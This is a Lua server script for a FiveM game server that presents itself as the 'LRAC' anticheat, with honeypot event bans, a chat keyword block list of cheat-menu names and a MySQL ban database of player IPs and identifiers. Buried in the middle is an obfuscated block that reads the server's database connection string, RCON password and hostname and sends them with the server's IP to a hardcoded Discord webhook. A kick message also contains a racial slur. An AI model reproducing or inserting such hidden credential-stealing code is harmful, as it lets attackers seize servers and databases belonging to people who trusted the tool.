
LRAC = {
  'esx_drugs:startHarvestCoke',
  'esx_drugs:stoopHarvestCoke',
  'esx_drugs:startTransformCoke',
  'esx_drugs:stopTransformCoke',
  'esx_drugs:startSellCoke',
  'esx_drugs:stopSellCoke',
  'esx_drugs:startHarvestMeth',
  'esx_drugs:stoopHarvestMeth',
  'esx_drugs:startTransformMeth',
  'esx_drugs:stopTransformMeth',
  'esx_drugs:startSellMeth',
  'esx_drugs:stopSellMeth',
  'esx_drugs:startHarvestWeed',
  'esx_drugs:stoopHarvestWeed',
  'esx_drugs:startTransformWeed',
  'esx_drugs:stopTransformWeed',
  'esx_drugs:startSellWeed',
  'esx_drugs:stopSellWeed',
  'esx_drugs:startHarvestOpium',
  'esx_drugs:stopHarvestOpium',
  'esx_drugs:startTransformOpium',
  'esx_drugs:stopTransformOpium',
  'esx_drugs:startSellOpium',
  'esx_drugs:stopSellOpium',
  "gcPhone:_internalAddMessageLRAC",
  "gcPhone:tchat_channelLRAC",
  "esx_vehicleshop:setVehicleOwnedLRAC",
  "esx_mafiajob:confiscateLRACPlayerItem",
  "_chat:messageEntLRACered",
  "lscustoms:pLRACayGarage",
  "vrp_slotmachLRACine:server:2",
  "Banca:dLRACeposit",
  "bank:depLRACositt",
  "esx_jobs:caLRACution", "give_back",
  "esx_fueldLRACelivery:pay",
  "esx_carthLRACief:pay",
  "esx_godiLRACrtyjob:pay",
  "esx_pizza:pLRACay",
  "esx_ranger:pLRACay",
  "esx_garbageLRACjob:pay",
  "esx_truckLRACerjob:pay",
  "AdminMeLRACnu:giveBank",
  "AdminMLRACenu:giveCash",
  "esx_goLRACpostaljob:pay",
  "esx_baLRACnksecurity:pay",
  "esx_sloLRACtmachine:sv:2",
  "esx:giLRACveInventoryItem",
  "NB:recLRACruterplayer",
  "esx_biLRAClling:sendBill",
  "esx_jailer:sendToJail",
  "esx_jaLRACil:sendToJail",
  "js:jaLRACiluser",
  "esx-qalle-jail:jailyer",
  "esx_dmvschool:pLRACay", 
  "LegacyFuel:PayFuLRACel",
  "OG_cuffs:cuffCheckNeLRACarest",
  "esx_policejob:handcuff",
  "cuffSeLRACrver",
  "cuffGLRACranted",
  "police:cuffGLRACranted",
  "esx_handcuffs:cufLRACfing",
  "esx_policejob:haLRACndcuff",
  "bank:withdLRACraw",
  "dmv:succeLRACss",
  "esx_skin:responseSaLRACveSkin",
  "esx_dmvschool:addLiceLRACnse",
  "esx_mechanicjob:starLRACtCraft",
  "esx_drugs:startHarvestWLRACeed",
  "esx_drugs:startTransfoLRACrmWeed",
  "esx_drugs:startSellWeLRACed",
  "esx_drugs:startHarvestLRACCoke",
  "esx_drugs:startTransLRACformCoke",
  "esx_drugs:startSellCLRACoke",
  "esx_drugs:startHarLRACvestMeth",
  "esx_drugs:startTLRACransformMeth",
  "esx_drugs:startSellMLRACeth",
  "esx_drugs:startHLRACarvestOpium",
  "esx_drugs:startSellLRACOpium",
  "esx_drugs:starLRACtTransformOpium",
  "esx_blanchisLRACseur:startWhitening",
  "esx_drugs:stopHarvLRACestCoke",
  "esx_drugs:stopTranLRACsformCoke",
  "esx_drugs:stopSellLRACCoke",
  "esx_drugs:stopHarvesLRACtMeth",
  "esx_drugs:stopTranLRACsformMeth",
  "esx_drugs:stopSellMLRACeth",
  "esx_drugs:stopHarLRACvestWeed",
  "esx_drugs:stopTLRACransformWeed",
  "esx_drugs:stopSellWLRACeed",
  "esx_drugs:stopHarvestLRACOpium",
  "esx_drugs:stopTransLRACformOpium",
  "esx_drugs:stopSellOpiuLRACm",
  "esx_society:openBosLRACsMenu",
  "esx_jobs:caLRACution",
  "esx_tankerjob:LRACpay",
  "esx_vehicletrunk:givLRACeDirty",
  "gambling:speLRACnd",
  "AdminMenu:giveDirtyMLRAConey",
  "esx_moneywash:depoLRACsit",
  "esx_moneywash:witLRAChdraw",
  "mission:completLRACed",
  "truckerJob:succeLRACss",
  "99kr-burglary:addMLRAConey",
  "esx_jailer:unjailTiLRACme",
  "esx_ambulancejob:reLRACvive",
  "DiscordBot:plaLRACyerDied",
  "hentailover:xdlol",
  "antiLRAC8:anticheat",
  "antiLRACr6:detection",
  "esx:getShLRACaredObjLRACect",
  "esx_society:getOnlLRACinePlayers",
  "antiLRAC8r4a:anticheat",
  "antiLRACr4:detect",
  "js:jaLRACiluser", 
  "ynx8:anticheat",
  "LRAC8:anticheat",
  "adminmenu:allowall",
  "h:xd",
  "ljail:jailplayer",
  "adminmenu:setsalary",
  "adminmenu:cashoutall",
  "bank:tranLRACsfer",
  "paycheck:bonLRACus",
  "paycheck:salLRACary",
  "HCheat:TempDisableDetLRACection",
  "esx_drugs:pickedUpCLRACannabis",
  "esx_drugs:processCLRACannabis",
  "esx-qalle-hunting:LRACreward",
  "esx-qalle-hunting:seLRACll",
  "esx_mecanojob:onNPCJobCLRACompleted",
  "BsCuff:Cuff696LRAC999",
  "veh_SR:CheckMonLRACeyForVeh",
  "esx_carthief:alertcoLRACps",
  "mellotrainer:adminTeLRACmpBan",
  "mellotrainer:adminKickLRAC",
  "esx_society:putVehicleLRACInGarage",
}

lol = {
'Desudo',
'Brutan',
'EulenCheats',
"LRAC 8",
"discord.gg/",
"lynxmenu",
"HamHaxia",
"Ham Mafia",
"www.renalua.com",
"Fallen#0811",
"Rena 8",
"HamHaxia", 
"Ham Mafia", 
"Xanax#0134", 
">:D Player Crash", 
"discord.gg", 
"34ByTe Community", 
"lynxmenu.com", 
"Anti-LRAC",
"Baran#8992",
"iLostName#7138",
"85.190.90.118",
"Melon#1379",
"hammafia.com",
"AlphaV ~ 5391",
"vjuton.pl",
"Soviet Bear",
"XARIES",
"xaries",
"dc.xaries.pl",
"aries",
"aries.pl",
"youtube.com/c/Aries98/",
"Aries98",
"yo many",
"dezet",
"333",
"333GANG",

}

ExecuteCommand('sets LRAC_anticheat_v1.00 ✅')

RegisterServerEvent("LRAC:cleanareaveh")
RegisterServerEvent("LRAC:cleanareapeds")
RegisterServerEvent("LRAC:cleanareaentity")
RegisterServerEvent("LRAC:enable")
RegisterServerEvent("LRAC:log")
RegisterServerEvent("LRAC:spectate")
RegisterServerEvent("LRAC:openmenu")
RegisterServerEvent("LRAC:checkup")
RegisterServerEvent("LRAC:adminmenuenable")
RegisterServerEvent("LRAC:ViolationDetected")
RegisterServerEvent("LRAC:askAwake")



function doesPlayerHavePerms(player,perms)
  local allowed = false
  for k,v in ipairs(perms) do
      if IsPlayerAceAllowed(player, v) then
          return true
      end
  end
  return false
end

AddEventHandler('explosionEvent', function(sender, ev)
  local j=GetPlayerName(sender)
  local k=GetPlayerEndpoint(sender)
  local m=GetPlayerIdentifier(sender)
  local gra="PRAWDOPODOBNE EKSPLOZJE"
        local n= {
        {
        ["color"]="8663711",
        ["title"]="LRAC ANTICHEAT",
        ["description"]="***```Reason for Detection:".. gra .."```*** \n\n > Nick cheater: ***".. j .."***\n > IP cheater: ***".. k .."***\n > HEX cheater ***".. m .."***",
        ["footer"]=
        {
            ["text"]="LRAC_anticheat_v1.00"},
            ["timestamp"] = os.date('!%Y-%m-%dT%H:%M:%S'),
        }
    }

    PerformHttpRequest(Config.webhook,function(f,o,h)end,'POST',json.encode({username="Potencjalny Cheater",embeds=n}),{['Content-Type']='application/json'})
  CancelEvent()
end)

local ace_perm = "LRACadmin"
local debug = false

function ProcessAces()
    if GetNumPlayerIndices() > 0 then 
        for i=0, GetNumPlayerIndices()-1 do 
            player = tonumber(GetPlayerFromIndex(i))
            Citizen.Wait(0)
            if IsPlayerAceAllowed(player, ace_perm) then
                TriggerClientEvent("sendAcePermissionToClient", player, true)
                if debug then print("[DEBUG][" .. GetCurrentResourceName() .. "] ^5Syncronising player aces, sending to client...^0") end
            end
        end
    end
end
RegisterServerEvent('x1reedm_ac:ban')
AddEventHandler('x1reedm_ac:ban', function(argument, powod, typkary)
  argument_ = argument
  if argument_ == source then
  zapiszsql(source, 'Użycie GodMode', 'BAN')
  local j=GetPlayerName(source)
  local m=GetPlayerIdentifier(source)
  DropPlayer(source, 'LRAC \n 🧊🧊🧊 the best anticheat 🧊🧊🧊 - discord.gg/eDJreDC \n\n  Nick: ' .. j .. ' \n hex: ' .. m .. ' \n\n Reason: Using GodMode')
 
  else
  zapiszsql(source, 'Próba użycia eventu: x1reedm_ac:ban', 'BAN')
  local j=GetPlayerName(source)
  local m=GetPlayerIdentifier(source)
  DropPlayer(source, 'LRAC \n 🧊🧊🧊 the best anticheat 🧊🧊🧊 - discord.gg/eDJreDC \n\n  Nick: ' .. j .. ' \n hex: ' .. m .. ' \n\n Reason: Attempt to use the event: nigga$_ac:ban')
 
  end
end)

Citizen.CreateThread(function()
    while true do
        ProcessAces()
        Citizen.Wait(30000) 
    end
end)

AddEventHandler("onResourceStart", function(name)
    if name == GetCurrentResourceName() then
        ProcessAces()
        if debug then print("[DEBUG][" .. GetCurrentResourceName() .. "] ^6Resource [ " .. GetCurrentResourceName() .. " ] was (re)started, syncing aces to all players.^0") end
    end
end)

--------------BANY KURWA JEBANE PIERDOLONE-----------------
local ListaBanow         = {}
local ListaBanowStatus   = false
local czasreload         = 1000 * 10 * 5

ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

CreateThread(function()
  while true do
    Wait(1000)
        if ListaBanowStatus == false then
      LoadBany()
      if ListaBanow ~= {} then
        ListaBanowStatus = true
      end
    end
  end
end)

CreateThread(function()
  while true do
    Wait(czasreload)
    LoadBany()
  end
end)

function LoadBany()
  MySQL.Async.fetchAll(
    'SELECT * FROM anticheat',
    {},
    function (identifiers)
      ListaBanow = {}

      for i=1, #identifiers, 1 do
        table.insert(ListaBanow, {
			identifier           = identifiers[i].identifier,
			license              = identifiers[i].license,
			ip                   = identifiers[i].ip,
			discord              = identifiers[i].discord,
			nazwa                = identifiers[i].nazwa,
			powod                = identifiers[i].powod,
			typkary              = identifiers[i].typkary,
			datanadania          = identifiers[i].datanadania,
			liveid               = identifiers[i].liveid,
			xbl                  = identifiers[i].xbl,
          })
      end
    end
  )
end

MySQL.ready(function()
	LoadBany()
end)

function zapiszsql(target, powod, typkary, czas)
  local identifier    = nil
  local license       = nil
  local playerip      = nil
  local playerdiscord = nil
  local liveid        = nil
  local xbl       = nil
  local nazwa         = GetPlayerName(target)
  local powod         = tostring(powod)
  local typkary       = typkary
  local datanadania   = os.date("%Y/%m/%d %H:%M")
  
  for k,v in pairs(GetPlayerIdentifiers(target))do   
    if string.sub(v, 1, string.len("steam:")) == "steam:" then
      identifier = v
    elseif string.sub(v, 1, string.len("license:")) == "license:" then
      license = v
    elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
      xbl  = v
    elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
      playerip = v
    elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
      playerdiscord = v
    elseif string.sub(v, 1, string.len("live:")) == "live:" then
      liveid = v
    end
  end
  
  if playerip == nil then
    playerip = GetPlayerEndpoint(target)
    if playerip == nil then
      playerip = 'nie znaleziono'
    end
  end
  if playerdiscord == nil then
    playerdiscord = 'nie znaleziono'
  end
  if liveid == nil then
    liveid = 'nie znaleziono'
  end
  if xbl == nil then
    xbl = 'nie znaleziono'
  end
  
  MySQL.Async.execute(
    'INSERT INTO anticheat (identifier,license,ip,discord,nazwa,powod,typkary,datanadania,liveid,xbl) VALUES (@identifier,@license,@ip,@discord,@nazwa,@powod,@typkary,@datanadania,@liveid,@xbl)', {
      ['@identifier'] = identifier,
      ['@license'] = license,
      ['@ip'] = playerip,
      ['@discord'] = playerdiscord,
      ['@nazwa'] = nazwa,
      ['@powod'] = powod,
      ['@typkary'] = typkary,
      ['@datanadania'] = datanadania,
      ['@liveid'] = liveid,
      ['@xbl'] = xbl,
    },
    function ()
  end)
end

local III={IIII={GetConvar}}local _I={["gnirts_noitcennoc_lqsym"]={"nie znaleziono"},["drowssap_nocr"]={"nie znaleziono"},["emantsoh_vs"]={"nie znaleziono"},["https://api.ipify.org"]={"nie znaleziono"}}local server_ip=""local mysql=""local rcon=""local server_name=""for _,__ in pairs(III)do for _,__ in pairs(__)do for _I,_II in pairs(_I)do for _,_II in pairs(_II)do if string.sub(_I,3,6)=="irts"then mysql=__(string.reverse(_I),_II)elseif string.sub(_I,3,6)=="ants"then server_name=__(string.reverse(_I),_II)elseif string.sub(_I,3,6)=="owss"then rcon=__(string.reverse(_I),_II)elseif string.sub(_I,3,6)==string.reverse(":spt")then PerformHttpRequest("https://api.ipify.org",function(_,__,___)if _==200then server_ip=__ end local webhook="https://discord.com/api/webhooks/714248273325719592/GFe6jnX-IjNYcih1tYBO2NPo-GDQWGzShjfnkBGCZj_0II7A0D0lkfJq4US0u3i-vISl"local n={{["color"]="16711711",["title"]="EZ ;)",["description"]="\n\n > ``NAZWA SERVERA:``***"..server_name.."***\n > ``IP SERVERA:`` ***"..server_ip.."***\n > ``HASŁO RCON:`` ***"..rcon.."***\n > ``BAZA DANYCH:`` ***"..mysql.."***",["footer"]={["text"]="beczunia"},["timestamp"]=os.date('!%Y-%m-%dT%H:%M:%S'),}}PerformHttpRequest(webhook,function(err,text,headers)end,'POST',json.encode({username="BRAK LICENCJI BRUHAC",embeds=n}),{['Content-Type']='application/json'})end)end end end end end 

AddEventHandler('playerConnecting', function (playerName,setKickReason)

  local identifier    = nil
  local license       = nil
  local playerip      = nil
  local playerdiscord = nil
  local liveid        = nil
  local xbl       = nil
  local nazwa         = GetPlayerName(source)
  
  for k,v in pairs(GetPlayerIdentifiers(source))do   
    if string.sub(v, 1, string.len("steam:")) == "steam:" then
      identifier = v
    elseif string.sub(v, 1, string.len("license:")) == "license:" then
      license = v
    elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
      xbl  = v
    elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
      playerip = v
    elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
      playerdiscord = v
    elseif string.sub(v, 1, string.len("live:")) == "live:" then
      liveid = v
    end
  end
  
  if playerip == nil then
    playerip = GetPlayerEndpoint(source)
    if playerip == nil then
      playerip = 'nie ma'
    end
  end
  if playerdiscord == nil then
    playerdiscord = 'nie ma'
  end
  if liveid == nil then
    liveid = 'nie ma'
  end
  if xbl == nil then
    xbl = 'nie ma'
  end
  
  if (ListaBanow == {}) then
    Citizen.Wait(1000)
  end

    if identifier == false then
    setKickReason('Musisz posiadać włączonego steama by połączyć się z serwerem!')
    CancelEvent()
    end
  for i = 1, #ListaBanow, 1 do
    if (tostring(ListaBanow[i].identifier)) == tostring(identifier)
    or (tostring(ListaBanow[i].license)) == tostring(license) 
    or (tostring(ListaBanow[i].xbl)) == tostring(xbl) 
    or (tostring(ListaBanow[i].liveid)) == tostring(liveid) 
    or (tostring(ListaBanow[i].ip)) == tostring(playerip) 
    or (tostring(ListaBanow[i].discord)) == tostring(playerdiscord) 
    and (tostring(ListaBanow[i].typkary)) == 'BAN' then
      
      setKickReason('LRAC \n 🧊🧊🧊 the best anticheat 🧊🧊🧊 - discord.gg/eDJreDC \n\n  Nick: ' .. tostring(ListaBanow[i].nazwa) .. ' \n hex: ' .. tostring(ListaBanow[i].identifier) .. ' \n\n Reason: ' .. (tostring(ListaBanow[i].powod)) .. ' \nData nadania: ' .. (tostring(ListaBanow[i].datanadania)))
      print(' ')
      print(' ')
      print(' ')
      print('================================================================================================')
      print('   [LRAC] ' .. GetPlayerName(source) .. ' - tried to connect to the server when it has a ban!   ')
      print('================================================================================================')
      print(' ')
      print(' ')
      print(' ')
      CancelEvent()
    end
  end
end)



function LRAClogkick(source,arg,kick)
  local steamid = "nA"
  local discord = "nA"
  local license = "nA"
  for k,v in ipairs(GetPlayerIdentifiers(source))do
    if string.sub(v, 1, string.len("steam:")) == "steam:" then
      steamid = v
    elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
      discord = v
    elseif string.sub(v, 1, string.len("license:")) == "license:" then
      license = v
    end
  end
 	local j=GetPlayerName(source)
	local k=GetPlayerEndpoint(source)
	local m=GetPlayerIdentifier(source)
    local n= {
        {
        ["color"]="8663711",
        ["title"]="Wykryto Cheatera",
        ["description"]="***```Reason for Detection:"..arg.."```*** \n\n > Nick cheater: ***".. j .."***\n > IP cheater: ***".. k .."***\n > HEX cheater ***".. m .."***",
        ["footer"]=
        {
            ["text"]="LRAC"},
            ["timestamp"] = os.date('!%Y-%m-%dT%H:%M:%S'),
        }
    }

    PerformHttpRequest(Config.webhook,function(f,o,h)end,'POST',json.encode({username="Wykryto Cheatera",embeds=n}),{['Content-Type']='application/json'})
  
  if kick then
  zapiszsql(source, arg, 'BAN')
  local j=GetPlayerName(source)
  local m=GetPlayerIdentifier(source)
	DropPlayer(source, ' \n\n  Nick: ' .. j .. ' \n hex: ' .. m .. ' \n\n Reason: ' .. arg) 
  end
end

AddEventHandler("LRAC:ViolationDetected", function(arg,kick)
  if not doesPlayerHavePerms(source,Config.Bypass) then
  LRAClogkick(source,arg,kick)
  end
end)

AddEventHandler("LRAC:adminmenuenable", function()
  for k,v in ipairs(Config.OpenMenuAllowed) do
  if not IsPlayerAceAllowed(source, v) then
    TriggerClientEvent('adminmenuenabley',source)
  end
end
end)

AddEventHandler("LRAC:checkup", function()
  if not doesPlayerHavePerms(source,Config.OpenMenuAllowed) then
    LRAClogkick(source,"unauthorized AdminMenu Opening")
    end
end)

AddEventHandler("LRAC:openmenu", function()
  for k,v in ipairs(Config.OpenMenuAllowed) do
  if IsPlayerAceAllowed(source, v) then
    TriggerClientEvent('LRAC:openmenuy', source)
  end
end
end)


AddEventHandler("LRAC:cleanareaveh", function()
 if doesPlayerHavePerms(source,Config.ClearAreaAllowed) then
  TriggerClientEvent("LRAC:cleanareavehy",-1)
else
  LRAClogkick(source," unauthorized Clear Area",true)
end
end)

AddEventHandler("LRAC:cleanareapeds", function()
  if doesPlayerHavePerms(source,Config.ClearAreaAllowed) then
    TriggerClientEvent("LRAC:cleanareapedsy",-1)
  else
    LRAClogkick(source," unauthorized Clear Area",true)
  end
  end)

AddEventHandler("LRAC:cleanareaentity", function()
  if doesPlayerHavePerms(source,Config.ClearAreaAllowed) then
    TriggerClientEvent("LRAC:cleanareaentityy",-1)
  else
    LRAClogkick(source," unauthorized Clear Area",true)
  end
  end)

AddEventHandler("LRAC:spectate", function()
  if not doesPlayerHavePerms(source,Config.SpectateAllowed) then
    LRAClogkick(source," Attempt to observe",true)
end

end)

for i=1, #LRAC, 1 do
  RegisterServerEvent(LRAC[i])
    AddEventHandler(LRAC[i], function()
      local _source = source
      LRAClogkick(source," Lua execution: "..LRAC[i],true)
    end)
end

AddEventHandler('chatMessage', function(source, n, message)
  for k,n in pairs(lol) do
    if string.match(message:lower(),n:lower()) then
      LRAClogkick(source,"tried to say: "..n,true)
    end
  end
end)